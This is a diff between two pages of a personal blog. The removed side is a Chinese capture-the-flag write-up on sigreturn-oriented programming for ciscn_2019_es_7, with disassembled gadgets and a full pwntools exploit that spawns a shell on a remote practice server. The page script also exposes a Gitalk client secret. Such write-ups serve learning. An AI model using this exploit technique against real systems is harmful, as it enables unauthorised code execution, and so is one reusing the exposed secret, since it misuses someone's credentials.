@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,20 +79,13 @@
 
 
 
-<meta name="description" content="srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图">
-<meta name="keywords" content="pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出进阶——srop">
-<meta property="og:url" content="https://sh1ner.github.io/2019/09/13/srop/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="luckyu&#39;s blog">
+<meta property="og:url" content="https://sh1ner.github.io/archives/2020/07/index.html">
 <meta property="og:site_name" content="luckyu&#39;s blog">
-<meta property="og:description" content="srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://sh1ner.github.io/2019/09/13/srop/images/1.png">
-<meta property="og:updated_time" content="2019-09-13T13:16:46.775Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="栈溢出进阶——srop">
-<meta name="twitter:description" content="srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图">
-<meta name="twitter:image" content="https://sh1ner.github.io/2019/09/13/srop/images/1.png">
+<meta name="twitter:title" content="luckyu&#39;s blog">
 
 
 
@@ -122,13 +115,13 @@
 
 
 
-  <link rel="canonical" href="https://sh1ner.github.io/2019/09/13/srop/">
+  <link rel="canonical" href="https://sh1ner.github.io/archives/2020/07/">
 
 
 
 
 
-  <title>栈溢出进阶——srop | luckyu's blog</title>
+  <title>归档 | luckyu's blog</title>
   
 
 
@@ -147,7 +140,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left page-archive">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -263,161 +256,72 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-expand">
-    
+  
+  
+  
+  <div class="post-block archive">
+    <div id="posts" class="posts-collapse">
+      <span class="archive-move-on"></span>
 
-  
+      <span class="archive-page-counter">
+        
+        
+        
+          
+        
+        嗯..! 目前共计 14 篇日志。 继续努力。
+      </span>
 
-  
-  
-  
+      
+
+        
+        
+        
+
+        
+          
+          <div class="collection-title">
+            <h1 class="archive-year" id="archive-year-2020">2020</h1>
+          </div>
+        
+        
+
+        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sh1ner.github.io/2019/09/13/srop/">
+    <header class="post-header">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content>
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="luckyu's blog">
-    </span>
-
-    
-      <header class="post-header">
-
+      <h2 class="post-title">
         
-        
-          <h1 class="post-title" itemprop="name headline">栈溢出进阶——srop</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
+            <a class="post-title-link" href="/2020/07/07/SCTF-2020-PWN/" itemprop="url">
               
-                <span class="post-meta-item-text">发表于</span>
+                <span itemprop="name">SCTF 2020 PWN</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-13T11:36:24+08:00">
-                2019-09-13
-              </time>
-            
+            </a>
+        
+      </h2>
 
-            
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated" datetime="2020-07-07T07:42:27+08:00" content="2020-07-07">
+          07-07
+        </time>
+      </div>
 
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <p>srop主要学习来源来自 ctf-wiki上的介绍：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br>原理、exp和题目不想做搬运，里面都可以找到<br>这里主要谈一下自己的心得：现附上一张图</p>
-<a id="more"></a>
-<p><img src="images/1.png" alt="示例图片1"><br>这个是根据ctf-wiki上的exp构造的栈空间的流程，可以发现大概利用流程就是通过read读入字节数的返回值修改rax，再将sigframe结构体写入栈中，再通过read读取syscall至返回地址，拼接字节使其返回值为15，从而执行sigreturn，又因为sigframe设置rip为syscall再次调用,执行execve(‘/bin/sh’,0,0)<br>由于直接将返回值改为syscall,会破坏rsp，无法继续read sigframe,所以采用两次读取sigframe，第一次目的是将rsp置为原址，并将返回地址main和第二个sigframe读入栈中，然后回到main执行read(0,rsp,0x400)，置rax为15，即可getshell<br>注意：一定要加上context.arch = ‘amd64’，关系到SigreturnFrame()的内容</p>
-<p>接下来是实战了一道例题：ciscn_2019_es_7，buuoj上有题目复现<br>其中提供了方便利用的gadget</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004004ED <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004ED                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004EE                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004F1                 <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004F4                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">400h</span>       <span class="comment">; count</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004F9                 <span class="keyword">lea</span>     <span class="built_in">rsi</span>, [<span class="built_in">rsp</span>+buf]  <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004FE                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400501</span>                 <span class="keyword">syscall</span>                 <span class="comment">; LINUX - sys_read</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400503</span>                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040050A                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">30h</span>        <span class="comment">; count</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040050F                 <span class="keyword">lea</span>     <span class="built_in">rsi</span>, [<span class="built_in">rsp</span>+buf]  <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400514</span>                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400517</span>                 <span class="keyword">syscall</span>                 <span class="comment">; LINUX - sys_write</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004004D6 gadgets         proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004D6 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004D6                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004D7                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004DA                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="number">0Fh</span>			<span class="comment">;修改rax为0xf 可执行sigreturn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E1                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E1 gadgets         endp <span class="comment">; sp-analysis failed</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E1</span><br><span class="line"><span class="symbol">.text:</span>00000000004004E2 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E2                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="number">3Bh</span>			<span class="comment">;修改rax为0x3b 可执行execve</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E9                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
-
-<p>由于这道题不知道怎么使用execve，就直接运用sigreturn来做了<br>主要利用过程就是先得到栈地址，由于返回地址要覆盖成read，所以只能找到一个栈空间下面的一段偏移，题目未开启pie则可以通过计算找到binsh字符串，然后就是写入sigframe，再利用给的gadget将rax设置为15即可<br>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./ciscn_2019_es_7')</span></span><br><span class="line">p = remote(<span class="string">'pwn.buuoj.cn'</span>, <span class="number">20179</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gadget = <span class="number">0x4004da</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">read = <span class="number">0x4004ed</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + p64(read)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvn(<span class="number">32</span>)</span><br><span class="line">stack_addr = u64(p.recvn(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">'leak stack addr :'</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## call execv("/bin/sh",0,0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr - <span class="number">280</span>  <span class="comment"># "/bin/sh" 's addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0</span>) + p64(gadget) + p64(syscall_ret) + str(sigframe)</span><br><span class="line"><span class="keyword">print</span> len(frame_payload)</span><br><span class="line">payload = frame_payload </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/08/18/jarvisoj-pwn-freenote-x64/" rel="next" title="jarvisoj-level6_x64-实战unlink利用">
-                <i class="fa fa-chevron-left"></i> jarvisoj-level6_x64-实战unlink利用
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/09/13/buuctf-pwn/" rel="prev" title="记录一下在buuctf刷的几个pwn题">
-                记录一下在buuctf刷的几个pwn题 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+    </header>
   </article>
 
 
 
-    <div class="post-spread">
       
+
     </div>
   </div>
+  
+  
+  
+
+  
+
 
 
           </div>
@@ -425,14 +329,6 @@
 
 
           
-
-  
-  <div id="gitalk-container">
-  </div>
-
-  
-  
-
 
         </div>
         
@@ -661,10 +557,6 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
@@ -705,21 +597,6 @@
 
 
 
-
-  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-   <script type="text/javascript">
-        var gitalk = new Gitalk({
-          clientID: '3e46d70ce27cadc03165',
-          clientSecret: 'b49765fcc4d70e6af647ded4fd819972903ad727',
-          repo: 'sh1ner.github.io',
-          owner: 'sh1ner',
-          admin: ['sh1ner'],
-          id: location.pathname,
-          distractionFreeMode: 'true'
-        })
-        gitalk.render('gitalk-container')           
-       </script>
 
 .gt-container a{border-bottom: none;}
   
